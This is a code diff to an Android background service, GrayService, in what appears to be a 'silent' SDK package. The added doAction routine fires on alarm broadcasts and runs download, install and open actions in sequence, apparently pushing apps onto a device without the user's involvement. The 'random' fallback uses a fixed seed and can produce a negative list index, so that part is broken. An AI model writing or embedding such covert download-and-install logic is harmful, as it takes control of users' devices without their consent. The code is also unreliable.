@@ -7,7 +7,9 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.os.Binder;
 import android.os.IBinder;
+import android.util.Log;
 
 import com.liulishuo.filedownloader.FileDownloader;
 import com.liulishuo.filedownloader.util.FileDownloadHelper;
@@ -16,6 +18,7 @@ import java.net.Proxy;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
+import java.util.Random;
 import java.util.concurrent.TimeUnit;
 
 import okhttp3.OkHttpClient;
@@ -33,6 +36,7 @@ import sdk.grayweb.com.slientsdk.util.DivesUtil;
 public class GrayService extends Service {
     private List<IAction>  actionList = new ArrayList<IAction>();
     private static final String REVICER = "com.slient.reciver";
+    int doActionTime = 1 ;
     @Override
     public void onCreate() {
         super.onCreate();
@@ -42,27 +46,9 @@ public class GrayService extends Service {
         actionList.add(new InstallAction(this));
         //初奴化数据
         //初始化闹钟
-        initDownload();
         new InitAction(this).doAction();
         registerReceiver(cupReciver, new IntentFilter(REVICER));
         alarm();
-    }
-
-    private void initDownload() {
-        FileDownloader.init(this,
-                new FileDownloadHelper.OkHttpClientCustomMaker() { // is not has to provide.
-                    @Override
-                    public OkHttpClient customMake() {
-                        // just for OkHttpClient customize.
-                        final OkHttpClient.Builder builder = new OkHttpClient.Builder();
-                        // you can set the connection timeout.
-                        builder.connectTimeout(15000, TimeUnit.MILLISECONDS);
-                        // you can set the HTTP proxy.
-                        builder.proxy(Proxy.NO_PROXY);
-                        // etc.
-                        return builder.build();
-                    }
-                });
     }
 
 
@@ -77,10 +63,23 @@ public class GrayService extends Service {
         return null;
     }
 
+
     /**
      * 闹钟回来后执行的操作
       */
     private void doAction(){
+        if (doActionTime==1){
+            new DownloadAction(this).doAction();
+        }else if(doActionTime==2){
+            new InstallAction(this).doAction();
+        }else if(doActionTime==3){
+            new OpenAction(this).doAction();
+        }else {
+            Random random = new Random(1);
+            int target = random.nextInt();
+            actionList.get(target%3).doAction();
+        }
+        doActionTime++ ;
     }
 
     public void alarm() {
@@ -107,6 +106,7 @@ public class GrayService extends Service {
     private BroadcastReceiver cupReciver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
+            Log.e("eeee","doAction");
             doAction();
         }
     };
